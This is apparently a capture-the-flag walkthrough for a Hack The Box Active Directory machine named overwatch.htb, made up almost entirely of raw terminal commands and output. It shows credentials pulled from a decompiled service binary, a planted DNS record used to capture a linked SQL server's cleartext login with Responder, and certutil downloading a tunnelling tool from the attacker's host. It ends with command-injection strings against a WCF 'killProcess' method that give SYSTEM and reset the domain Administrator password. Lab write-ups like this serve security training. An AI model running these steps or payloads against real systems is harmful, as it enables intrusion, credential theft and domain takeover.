└─$ nmap  -sSCV 10.129.244.81  --min-rate 999   
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-12 18:48 +1100
Host is up (0.10s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-12 07:48:31Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=S200401.overwatch.htb
| Not valid before: 2025-12-07T15:16:06
|_Not valid after:  2026-06-08T15:16:06
| rdp-ntlm-info: 
|   Target_Name: OVERWATCH
|   NetBIOS_Domain_Name: OVERWATCH
|   NetBIOS_Computer_Name: S200401
|   DNS_Domain_Name: overwatch.htb
|   DNS_Computer_Name: S200401.overwatch.htb
|   DNS_Tree_Name: overwatch.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-12T07:48:40+00:00
|_ssl-date: 2026-02-12T07:49:20+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows
6520/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info: 
|   10.129.2.33:6520: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 6520
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-02-13T05:09:33
|_Not valid after:  2056-02-13T05:09:33
|_ssl-date: 2026-02-13T05:55:56+00:00; -1s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.2.33:6520: 
|     Target_Name: OVERWATCH
|     NetBIOS_Domain_Name: OVERWATCH
|     NetBIOS_Computer_Name: S200401
|     DNS_Domain_Name: overwatch.htb
|     DNS_Computer_Name: S200401.overwatch.htb
|     DNS_Tree_Name: overwatch.htb
|_    Product_Version: 10.0.20348


└─$ ldapsearch -x -H ldap://10.129.244.81 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=overwatch,DC=htb
namingcontexts: CN=Configuration,DC=overwatch,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=overwatch,DC=htb
namingcontexts: DC=DomainDnsZones,DC=overwatch,DC=htb
namingcontexts: DC=ForestDnsZones,DC=overwatch,DC=htb

# search result
search: 2
result: 0 Success


─$ netexec smb 10.129.244.81 -u guest -p '' --shares
[*] Initializing SMB protocol database
SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.81   445    S200401          [+] overwatch.htb\guest: 
SMB         10.129.244.81   445    S200401          [*] Enumerated shares
SMB         10.129.244.81   445    S200401          Share           Permissions     Remark
SMB         10.129.244.81   445    S200401          -----           -----------     ------
SMB         10.129.244.81   445    S200401          ADMIN$                          Remote Admin
SMB         10.129.244.81   445    S200401          C$                              Default share
SMB         10.129.244.81   445    S200401          IPC$            READ            Remote IPC
SMB         10.129.244.81   445    S200401          NETLOGON                        Logon server share 
SMB         10.129.244.81   445    S200401          software$       READ            
SMB         10.129.244.81   445    S200401          SYSVOL      


└─$ smbclient //10.129.244.81/software$ --user=guest --password=''
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DH        0  Sat May 17 11:27:07 2025
  ..                                DHS        0  Thu Jan  1 17:46:47 2026
  Monitoring                         DH        0  Sat May 17 11:32:43 2025

		7147007 blocks of size 4096. 959404 blocks available
smb: \> cd Monitoring\
smb: \Monitoring\> ls
  .                                  DH        0  Sat May 17 11:32:43 2025
  ..                                 DH        0  Sat May 17 11:27:07 2025
  EntityFramework.dll                AH  4991352  Fri Apr 17 06:38:42 2020
  EntityFramework.SqlServer.dll      AH   591752  Fri Apr 17 06:38:56 2020
  EntityFramework.SqlServer.xml      AH   163193  Fri Apr 17 06:38:56 2020
  EntityFramework.xml                AH  3738289  Fri Apr 17 06:38:40 2020
  Microsoft.Management.Infrastructure.dll     AH    36864  Tue Jul 18 00:46:10 2017
  overwatch.exe                      AH     9728  Sat May 17 11:19:24 2025
  overwatch.exe.config               AH     2163  Sat May 17 11:02:30 2025
  overwatch.pdb                      AH    30208  Sat May 17 11:19:24 2025
  System.Data.SQLite.dll             AH   450232  Mon Sep 30 06:41:18 2024
  System.Data.SQLite.EF6.dll         AH   206520  Mon Sep 30 06:40:06 2024
  System.Data.SQLite.Linq.dll        AH   206520  Mon Sep 30 06:40:42 2024
  System.Data.SQLite.xml             AH  1245480  Sun Sep 29 04:48:00 2024
  System.Management.Automation.dll     AH   360448  Tue Jul 18 00:46:10 2017
  System.Management.Automation.xml     AH  7145771  Tue Jul 18 00:46:10 2017
  x64                                DH        0  Sat May 17 11:32:33 2025
  x86                                DH        0  Sat May 17 11:32:33 2025

		7147007 blocks of size 4096. 959377 blocks available
smb: \Monitoring\> cd x64
ls
smb: \Monitoring\x64\> ls
  .                                  DH        0  Sat May 17 11:32:33 2025
  ..                                 DH        0  Sat May 17 11:32:43 2025
  SQLite.Interop.dll                 AH  2005688  Sun Sep 29 05:18:20 2024

		7147007 blocks of size 4096. 972635 blocks available
smb: \Monitoring\x64\> cd ..
smb: \Monitoring\> mget overwatch.*
Get file overwatch.exe? y
getting file \Monitoring\overwatch.exe of size 9728 as overwatch.exe (24.1 KiloBytes/sec) (average 24.1 KiloBytes/sec)
Get file overwatch.exe.config? y
getting file \Monitoring\overwatch.exe.config of size 2163 as overwatch.exe.config (5.4 KiloBytes/sec) (average 14.7 KiloBytes/sec)
Get file overwatch.pdb? y
getting file \Monitoring\overwatch.pdb of size 30208 as overwatch.pdb (53.4 KiloBytes/sec) (average 30.7 KiloBytes/sec)
smb: \Monitoring\> bye
bye: command not found
smb: \Monitoring\> exit


dnspy decomplie the exe file
// MonitoringService
// Token: 0x04000003 RID: 3
private readonly string connectionString = "Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;";
// Token: 0x0600000A RID: 10 RVA: 0x000022AC File Offset: 0x000004AC
public MonitoringService()


└─$ netexec ldap 10.129.244.81 -d  overwatch.htb -u guest -p ""  -k
LDAP        10.129.244.81   389    S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.244.81   389    S200401          [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090D0D, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c
LDAP        10.129.244.81   389    S200401          [+] overwatch.htb\guest: 


└─$ nxc ldap S200401.overwatch.htb -d overwatch.htb -u sqlsvc -p "TI0LKcfHzZw1Vv" --users
LDAP        10.129.2.33     389    S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.2.33     389    S200401          [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv 
LDAP        10.129.2.33     389    S200401          [*] Enumerated 105 domain users: overwatch.htb
LDAP        10.129.2.33     389    S200401          -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        10.129.2.33     389    S200401          Administrator                 2025-05-17 13:09:35 0        Built-in account for administering the computer/domain
LDAP        10.129.2.33     389    S200401          Guest                         2025-05-17 14:34:27 0        Built-in account for guest access to the computer/domain
LDAP        10.129.2.33     389    S200401          krbtgt                        2025-05-17 10:08:45 0        Key Distribution Center Service Account
LDAP        10.129.2.33     389    S200401          sqlsvc                        2025-05-17 10:47:43 0       
LDAP        10.129.2.33     389    S200401          sqlmgmt                       2025-05-17 11:24:21 0       
LDAP        10.129.2.33     389    S200401          Charlie.Moss                  2025-05-17 13:05:41 0       
LDAP        10.129.2.33     389    S200401          Tracy.Burns                   2025-05-17 13:05:41 0       
LDAP        10.129.2.33     389    S200401          Kathryn.Bryan                 2025-05-17 13:05:41 0       
LDAP        10.129.2.33     389    S200401          Rachael.Thomas                2025-05-17 13:05:41 0       
LDAP        10.129.2.33     389    S200401          Aimee.Smith                   2025-05-17 13:05:41 0       
LDAP        10.129.2.33     389    S200401          Duncan.Freeman                2025-05-17 13:05:41 0  

└─$ nxc ldap S200401.overwatch.htb -d overwatch.htb -u sqlsvc -p "TI0LKcfHzZw1Vv" --computers
LDAP        10.129.2.33     389    S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.2.33     389    S200401          [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv 
LDAP        10.129.2.33     389    S200401          [*] Total records returned: 6
LDAP        10.129.2.33     389    S200401          S200401$
LDAP        10.129.2.33     389    S200401          SQL03$
LDAP        10.129.2.33     389    S200401          NB001$
LDAP        10.129.2.33     389    S200401          NB002$
LDAP        10.129.2.33     389    S200401          FILE01$
LDAP        10.129.2.33     389    S200401          S200400$

└─$ nxc ldap S200401.overwatch.htb -d overwatch.htb -u sqlsvc -p "TI0LKcfHzZw1Vv" --get-sid
LDAP        10.129.2.33     389    S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.2.33     389    S200401          [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv 
LDAP        10.129.2.33     389    S200401          Domain SID S-1-5-21-2797066498-1365161904-233915892
                                                                                                              
┌──(ed㉿kali)-[~]
└─$ impacket-GetUserSPNs -dc-host S200401.overwatch.htb  overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv -k -request  
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
No entries found!
                     
└─$ impacket-mssqlclient overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@S200401.overwatch.htb -port 6520 -windows-auth
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (OVERWATCH\sqlsvc  guest@master)> .tables
ERROR(S200401\SQLEXPRESS): Line 1: Could not find stored procedure 'tables'.
SQL (OVERWATCH\sqlsvc  guest@master)> select name from sys.databases;
name        
---------   
master      
tempdb      
model       
msdb        
overwatch   
SQL (OVERWATCH\sqlsvc  guest@master)> use overwatch;
ENVCHANGE(DATABASE): Old Value: master, New Value: overwatch
INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'overwatch'.
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> select name from sys.tables;
name       
--------   
Eventlog   
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> select * from Eventlog;
Id   Timestamp   EventType   Details   
--   ---------   ---------   -------   
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> enum_links
SRV_NAME             SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE       SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
------------------   ----------------   -----------   ------------------   ------------------   ------------   -------   
S200401\SQLEXPRESS   SQLNCLI            SQL Server    S200401\SQLEXPRESS   NULL                 NULL           NULL      
SQL07                SQLNCLI            SQL Server    SQL07                NULL                 NULL           NULL      
Linked Server   Local Login   Is Self Mapping   Remote Login   
-------------   -----------   ---------------   ------------   
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> use_link [SQL07];
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Login timeout expired".
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "A network-related or instance-specific error has occurred while establishing a connection to SQL Server. Server is not found or not accessible. Check if instance name is correct and if SQL Server is configured to allow remote connections. For more information see SQL Server Books Online.".
ERROR(MSOLEDBSQL): Line 0: Named Pipes Provider: Could not open a connection to SQL Server [64]. 



└─$ dig  sql07.overwatch.htb @s200401.overwatch.htb 

; <<>> DiG 9.20.15-2-Debian <<>> sql07.overwatch.htb @s200401.overwatch.htb
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 54510
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;sql07.overwatch.htb.		IN	A

;; AUTHORITY SECTION:
overwatch.htb.		3600	IN	SOA	s200401.overwatch.htb. hostmaster.overwatch.htb. 222 900 600 86400 3600

;; Query time: 84 msec
;; SERVER: 10.129.2.33#53(s200401.overwatch.htb) (UDP)
;; WHEN: Fri Feb 13 17:04:18 AEDT 2026
;; MSG SIZE  rcvd: 116

└─$ bloodyAD -d overwatch.htb -u sqlsvc -p 'TI0LKcfHzZw1Vv' --dc-ip 10.129.2.33 add dnsRecord sql07 "10.10.16.48"
[+] sql07 has been successfully added
                                                                                                              
┌──(ed㉿kali)-[~]
└─$ dig  sql07.overwatch.htb @s200401.overwatch.htb  

; <<>> DiG 9.20.15-2-Debian <<>> sql07.overwatch.htb @s200401.overwatch.htb
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 34513
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;sql07.overwatch.htb.		IN	A

;; ANSWER SECTION:
sql07.overwatch.htb.	300	IN	A	10.10.16.48

;; Query time: 88 msec
;; SERVER: 10.129.2.33#53(s200401.overwatch.htb) (UDP)
;; WHEN: Fri Feb 13 17:09:35 AEDT 2026
;; MSG SIZE  rcvd: 64



SQL (OVERWATCH\sqlsvc  dbo@overwatch)> use_link [SQL07];
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Login timeout expired".
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "A network-related or instance-specific error has occurred while establishing a connection to SQL Server. Server is not found or not accessible. Check if instance name is correct and if SQL Server is configured to allow remote connections. For more information see SQL Server Books Online.".
ERROR(MSOLEDBSQL): Line 0: Named Pipes Provider: Could not open a connection to SQL Server [64]. 
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> use_link [SQL07];
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Communication link failure".
ERROR(MSOLEDBSQL): Line 0: TCP Provider: An existing connection was forcibly closed by the remote host.


└─$ sudo responder -I tun0
[sudo] password for ed: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

[MSSQL] Cleartext Client   : 10.129.2.33
[MSSQL] Cleartext Hostname : SQL07 ()
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx

cannot evil-winrm login host using sqlsvc, but sqlmgmt is able to, and get user.
CANNOT find path from sqlsvc and sqlmgmt to domain, from bloodhound.


➜  Desktop cat overwatch.exe.config 
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <configSections>
    <!-- For more information on Entity Framework configuration, visit http://go.microsoft.com/fwlink/?LinkID=237468 -->
    <section name="entityFramework" type="System.Data.Entity.Internal.ConfigFile.EntityFrameworkSection, EntityFramework, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" requirePermission="false" />
  </configSections>
  <system.serviceModel>
    <services>
      <service name="MonitoringService">
        <host>
          <baseAddresses>
            <add baseAddress="http://overwatch.htb:8000/MonitorService" />
          </baseAddresses>
        </host>




*Evil-WinRM* PS C:\Users\sqlmgmt\desktop> certutil.exe -urlcache -f http://10.10.16.48:/chisel.exe c.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.



PS C:\Users\sqlmgmt\Documents> ./iox fwd -r 127.0.0.1:8000 -r 10.10.16.48:8001
[*] Forward TCP traffic between 127.0.0.1:8000 (encrypted: false) and 10.10.16.48:8001 (encrypted: false)


┌──(ed㉿kali)-[~/tools]
└─$ ./iox fwd -l 8000 -l 8001
[*] Forward TCP traffic between 0.0.0.0:8000 (encrypted: false) and 0.0.0.0:8001 (encrypted: false)

*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> $wcfClient = New-WebServiceProxy -Uri "http://overwatch.htb:8000/MonitorService?wsdl" -UseDefaultCredential
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> $wcfClient.killProcess("a;whoami /all;echo ")

USER INFORMATION
----------------

User Name           SID
=================== ========
nt authority\system S-1-5-18


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
Mandatory Label\System Mandatory Level Label            S-1-16-16384


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeAuditPrivilege                          Generate security audits                                           Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
-Force


*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> $wcfClient.killProcess("a;net user Administrator Qwe123456 /domain;echo ")
The command completed successfully.

-Force


└─$ nxc ldap overwatch.htb -u Administrator -p "Qwe123456"
LDAP        10.129.2.33     389    S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.2.33     389    S200401          [+] overwatch.htb\Administrator:Qwe123456 (Pwn3d!)

└─$ evil-winrm -i overwatch.htb  -u Administrator -p Qwe123456  

                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
overwatch\administrator
